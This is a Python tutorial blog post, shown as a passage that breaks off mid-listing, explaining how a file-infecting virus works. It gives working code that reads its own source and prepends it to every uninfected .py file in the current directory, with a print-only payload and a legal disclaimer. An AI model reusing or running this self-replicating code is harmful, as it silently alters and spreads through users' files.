<!doctype html><html lang=en-us><head><script data-ad-client=ca-pub-1030730506660314 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><script id=mNCC language=javascript>medianet_width="728",medianet_height="90",medianet_crid="167545135",medianet_versionId="3111299"</script><script src="//contextual.media.net/nmedianet.js?cid=8CU62P5S3"></script><script type=text/javascript src=https://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js></script><script type=text/javascript src=https://blockchain.info/Resources/js/pay-now-button.js></script><link rel=preload href=../../lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=../../lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=../../lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=../../lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><script type=text/javascript src=https://latest.cactus.chat/cactus.js></script><link rel=stylesheet href=https://latest.cactus.chat/style.css type=text/css><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>How to create a computer virus in Python | The Python Corner</title><link rel=canonical href=https://mastro35.github.io/tpc/posts/2021-08-30-how-to-create-virus-python/><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:title" content="How to create a computer virus in Python"><meta property="og:description" content="I was relaxing on a beach during my summer leave when I received a mail from a reader that asked me if it is technically possible to write a virus using Python.
The short answer: YES.
The longer answer: yes, BUT&mldr;
Let&rsquo;s start by saying that viruses are a little bit anachronistic in 2021&mldr; nowadays other kinds of malware (like worms for example) are far more common than viruses. Moreover, modern operative systems are more secure and less prone to be infected than MS-DOS or Windows 95 were (sorry Microsoft&mldr;) and people are more aware of the risk of malware in general."><meta property="og:type" content="article"><meta property="og:url" content="https://mastro35.github.io/tpc/posts/2021-08-30-how-to-create-virus-python/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-30T16:00:47+01:00"><meta property="article:modified_time" content="2021-08-30T16:00:47+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="How to create a computer virus in Python"><meta name=twitter:description content="I was relaxing on a beach during my summer leave when I received a mail from a reader that asked me if it is technically possible to write a virus using Python.
The short answer: YES.
The longer answer: yes, BUT&mldr;
Let&rsquo;s start by saying that viruses are a little bit anachronistic in 2021&mldr; nowadays other kinds of malware (like worms for example) are far more common than viruses. Moreover, modern operative systems are more secure and less prone to be infected than MS-DOS or Windows 95 were (sorry Microsoft&mldr;) and people are more aware of the risk of malware in general."><link rel=stylesheet href=https://mastro35.github.io/tpc/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N+XoIuZg=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://mastro35.github.io/tpc/images/favicon.ico><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-120027408-1','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu><span id=nav><ul><li><a href=../../>Home</a></li><li><a href=../../posts>Articles</a></li><li><a href=../../tags>Tags</a></li><li><a href=../../about>About</a></li><li><a href=../../help_us>Help Us</a></li><li><a href=https://buttondown.email/thepythoncorner>Newsletter</a></li><li><a href=https://shop.spreadshirt.com/the-python-corner>Swag Store</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://mastro35.github.io/tpc/posts/2021-01-16-how-create-telegram-bot-in-python/ aria-label=Previous><i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i></a></li><li><a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page"><i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i></a></li><li><a class=icon href=# aria-label=Share><i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f" aria-label=Facebook><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&text=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&title=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=Linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&is_video=false&description=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=Pinterest><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=How%20to%20create%20a%20computer%20virus%20in%20Python&body=Check out this article: https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f" aria-label=Email><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&title=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=Pocket><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&title=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=reddit><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&name=How%20to%20create%20a%20computer%20virus%20in%20Python&description=I%20was%20relaxing%20on%20a%20beach%20during%20my%20summer%20leave%20when%20I%20received%20a%20mail%20from%20a%20reader%20that%20asked%20me%20if%20it%20is%20technically%20possible%20to%20write%20a%20virus%20using%20Python.%0aThe%20short%20answer%3a%20YES.%0aThe%20longer%20answer%3a%20yes%2c%20BUT%26hellip%3b%0aLet%26rsquo%3bs%20start%20by%20saying%20that%20viruses%20are%20a%20little%20bit%20anachronistic%20in%202021%26hellip%3b%20nowadays%20other%20kinds%20of%20malware%20%28like%20worms%20for%20example%29%20are%20far%20more%20common%20than%20viruses.%20Moreover%2c%20modern%20operative%20systems%20are%20more%20secure%20and%20less%20prone%20to%20be%20infected%20than%20MS-DOS%20or%20Windows%2095%20were%20%28sorry%20Microsoft%26hellip%3b%29%20and%20people%20are%20more%20aware%20of%20the%20risk%20of%20malware%20in%20general." aria-label=Tumblr><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&t=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label="Hacker News"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#trying-to-hide-the-virus-code-a-little-more>Trying to hide the virus code a little more</a></li><li><a href=#to-sum-up>To sum up</a></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">How to create a computer virus in Python</h1><div class=meta><div class=postdate><time datetime="2021-08-30 16:00:47 +0100 +0100" itemprop=datePublished>2021-08-30</time></div><div class=author></div><div class=article-read-time><i class="far fa-clock"></i>
14 minute read</div><div class=article-category><i class="fas fa-archive"></i>
<a class=category-link href=../../categories/dev>Dev</a></div><div class=article-tag><i class="fas fa-tag"></i>
<a class=tag-link href=../../tags/virus rel=tag>virus</a>
,
<a class=tag-link href=../../tags/python rel=tag>python</a></div></div></header><div class=content itemprop=articleBody><p><img src=https://imgs.xkcd.com/comics/retro_virus.png alt=teaser></p><p>I was relaxing on a beach during my summer leave when I received a mail from a reader that asked me if it is technically possible to write a virus using Python.</p><p>The short answer: YES.</p><p>The longer answer: yes, BUT&mldr;</p><p>Let&rsquo;s start by saying that viruses are a little bit anachronistic in 2021&mldr; nowadays other kinds of malware (like <a href=https://en.wikipedia.org/wiki/Computer_worm>worms</a> for example) are far more common than viruses. Moreover, modern operative systems are more secure and less prone to be infected than MS-DOS or Windows 95 were (sorry Microsoft&mldr;) and people are more aware of the risk of malware in general.</p><p>Moreover, to write a computer virus, probably Python is not the best choice at all. It&rsquo;s an interpreted language and so it needs an interpreter to be executed. Yes, you can embed an interpreter to your virus but your resulting virus will be heavier and a little clunky&mldr; let&rsquo;s be clear, to write a virus probably other languages that can work to a lower level and that can be compiled are probably a better choice and that&rsquo;s why in the old days it was very common to see viruses written in C or Assembly.</p><p>That said, it is still possible to write computer viruses in Python, and in this article, you will have a practical demonstration.</p><blockquote><p>I met my first computer virus in 1988. I was playing an old CGA platform game with my friend Alex, that owned a wonderful <a href=https://en.wikipedia.org/wiki/Olivetti_M24>Olivetti M24</a> computer (yes, I&rsquo;m THAT old&mldr;) when the program froze and a little ball started to go around the screen. We had never seen anything like that before and so we didn&rsquo;t know it back then, but we were facing the <a href=https://en.wikipedia.org/wiki/Ping-Pong_virus>Ping-Pong virus</a> one of the most famous and common viruses ever&mldr; at least here in Italy.</p></blockquote><p>Now, before start, you know I have to write a little disclaimer.</p><hr><p>This article will show you that a computer virus in Python is possible and even easy to be written. However, <em><strong>I am NOT encouraging you to write a computer virus</strong></em> (neither in Python nor in ANY OTHER LANGUAGES), and I want to remember you that <strong>HARMING AN IT SYSTEM IS A CRIME</strong>!</p><hr><p>Now, we can proceed.</p><p>According to Wikipedia&mldr;</p><blockquote><p>a <a href=https://en.wikipedia.org/wiki/Computer_virus>computer virus</a> is a computer program that, when executed, replicates itself by modifying other computer programs and inserting its own code. If this replication succeeds, the affected areas are then said to be &ldquo;infected&rdquo; with a computer virus, a metaphor derived from biological viruses.</p></blockquote><p>That means that our main goal when writing a virus is to create a program that can spread around and replicate infecting other files, usually bringing a &ldquo;payload&rdquo;, which is a malicious function that we want to execute on the target system.</p><p>Usually, a computer virus does is made by three parts:</p><ol><li>The infection vector: this part is responsible to find a target and propagates to this target</li><li>The trigger: this is the condition that once met execute the payload</li><li>The payload: the malicious function that the virus carries around</li></ol><p>Let&rsquo;s start coding.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#ff79c6>try</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>    <span style=color:#6272a4># retrieve the virus code from the current infected script</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span>    virus_code <span style=color:#ff79c6>=</span> get_virus_code() 
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span>    <span style=color:#6272a4># look for other files to infect</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span>    <span style=color:#ff79c6>for</span> file <span style=color:#ff79c6>in</span> find_files_to_infect():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>        infect(file, virus_code)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>    <span style=color:#6272a4># call the payload</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span>    summon_chaos()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span style=color:#6272a4># except:</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span style=color:#6272a4>#     pass</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span style=color:#ff79c6>finally</span>:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span>    <span style=color:#6272a4># delete used names from memory</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>list</span>(<span style=color:#8be9fd;font-style:italic>globals</span>()<span style=color:#ff79c6>.</span>keys()):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span>        <span style=color:#ff79c6>if</span>(i[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;_&#39;</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span>            exec(<span style=color:#f1fa8c>&#39;del </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>format(i))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span>    <span style=color:#ff79c6>del</span> i
</code></pre></div><p>Let&rsquo;s analyze this code.</p><p>First of all, we call the <code>get_virus_code()</code> function, which returns the source code of the virus taken from the current script.</p><p>Then, the <code>find_files_to_infect()</code> function will return the list of files that can be infected and for each file returned, the virus will spread the infection.</p><p>After the infection took place, we just call the <code>summon_chaos()</code> function, that is - as suggested by its name - the payload function with the malware code.</p><p>That&rsquo;s it, quite simple uh?</p><p>Obviously, everything has been inserted in a <code>try-except</code> block, so that to be sure that exceptions on our virus code are trapped and ignored by the <code>pass</code> statement in the <code>except</code> block.</p><p>The <code>finally</code> block is the last part of the virus, and its goal is to remove used names from memory so that to be sure to have no impact on how the infected script works.</p><p>Okay, now we need to implement the stub functions we have just created! :)</p><p>Let&rsquo;s start with the first one: the <code>get_virus_code()</code> function.</p><p>To get the current virus code, we will simply read the current script and get what we find between two defined comments.</p><p>For example:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_content_of_file</span>(file):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>    data <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>None</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span>    <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(file, <span style=color:#f1fa8c>&#34;r&#34;</span>) <span style=color:#ff79c6>as</span> my_file:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span>        data <span style=color:#ff79c6>=</span> my_file<span style=color:#ff79c6>.</span>readlines()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span>    <span style=color:#ff79c6>return</span> data
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_virus_code</span>():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span>    virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>    virus_code <span style=color:#ff79c6>=</span> []
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span>    code <span style=color:#ff79c6>=</span> get_content_of_file(__file__)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span>    <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> code:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# begin-virus</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span>            virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>True</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span>        <span style=color:#ff79c6>if</span> virus_code_on:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span>            virus_code<span style=color:#ff79c6>.</span>append(line)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# end-virus</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span>            virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span>            <span style=color:#ff79c6>break</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span>    <span style=color:#ff79c6>return</span> virus_code
</code></pre></div><p>Now, let&rsquo;s implement the <code>find_files_to_infect()</code> function. Here we will write a simple function that returns all the <code>*.py</code> files in the current directory. Easy enough to be tested and&mldr; safe enough so as not to damage our current system! :)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#ff79c6>import</span> glob
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>find_files_to_infect</span>(directory <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;.&#34;</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>    <span style=color:#ff79c6>return</span> [file <span style=color:#ff79c6>for</span> file <span style=color:#ff79c6>in</span> glob<span style=color:#ff79c6>.</span>glob(<span style=color:#f1fa8c>&#34;*.py&#34;</span>)]
</code></pre></div><p>This routine could also be a good candidate to be written with a generator. What? You don&rsquo;t know generators? Let&rsquo;s have a look at <a href=http://thepythoncorner.com/dev/iterators-generators-python/>this interesting article</a> then! ;)</p><p>And once we have the list of files to be infected, we need the infection function. In our case, we will just write our virus at the beginning of the file we want to infect, like this:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_content_if_infectable</span>(file):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>    data <span style=color:#ff79c6>=</span> get_content_of_file(file)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span>    <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> data:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# begin-virus&#34;</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span>            <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>None</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span>    <span style=color:#ff79c6>return</span> data
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>infect</span>(file, virus_code):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>    <span style=color:#ff79c6>if</span> (data<span style=color:#ff79c6>:=</span>get_content_if_infectable(file)):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span>        <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(file, <span style=color:#f1fa8c>&#34;w&#34;</span>) <span style=color:#ff79c6>as</span> infected_file:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>            infected_file<span style=color:#ff79c6>.</span>write(<span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>join(virus_code))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span>            infected_file<span style=color:#ff79c6>.</span>writelines(data)
</code></pre></div><p>Now, all we need is to add the payload. Since we don&rsquo;t want to do anything that can harm the system, let&rsquo;s just create a function that prints out something to the console.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>summon_chaos</span>():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>  <span style=color:#6272a4># the virus payload</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>  <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;We are sick, fucked up and complicated</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>We are chaos, we can&#39;t be cured&#34;</span>)
</code></pre></div><p>Ok, our virus is ready! Let&rsquo;s see the full source code:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span style=color:#6272a4># begin-virus</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span style=color:#ff79c6>import</span> glob
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>find_files_to_infect</span>(directory <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;.&#34;</span>):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span>    <span style=color:#ff79c6>return</span> [file <span style=color:#ff79c6>for</span> file <span style=color:#ff79c6>in</span> glob<span style=color:#ff79c6>.</span>glob(<span style=color:#f1fa8c>&#34;*.py&#34;</span>)]
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_content_of_file</span>(file):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span>    data <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>None</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span>    <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(file, <span style=color:#f1fa8c>&#34;r&#34;</span>) <span style=color:#ff79c6>as</span> my_file:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span>        data <span style=color:#ff79c6>=</span> my_file<span style=color:#ff79c6>.</span>readlines()
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span>    <span style=color:#ff79c6>return</span> data
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_content_if_infectable</span>(file):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span>    data <span style=color:#ff79c6>=</span> get_content_of_file(file)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span>    <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> data:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# begin-virus&#34;</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span>            <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>None</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span>    <span style=color:#ff79c6>return</span> data
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>infect</span>(file, virus_code):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span>    <span style=color:#ff79c6>if</span> (data<span style=color:#ff79c6>:=</span>get_content_if_infectable(file)):
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span>        <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(file, <span style=color:#f1fa8c>&#34;w&#34;</span>) <span style=color:#ff79c6>as</span> infected_file:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span>            infected_file<span style=color:#ff79c6>.</span>write(<span style=color:#f1fa8c>&#34;&#34;</span><span style=color:#ff79c6>.</span>join(virus_code))
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span>            infected_file<span style=color:#ff79c6>.</span>writelines(data)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_virus_code</span>():
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span>    virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span>    virus_code <span style=color:#ff79c6>=</span> []
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span>    code <span style=color:#ff79c6>=</span> get_content_of_file(__file__)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span>    <span style=color:#ff79c6>for</span> line <span style=color:#ff79c6>in</span> code:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span>        <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#34;# begin-virus</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>in</span> line:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span>            virus_code_on <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>True</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span>        <span style=color:#ff79c6>if</span> virus_code_on:
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span>            virus_code<span style=color:#ff79c6>.</span>append(line)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span>
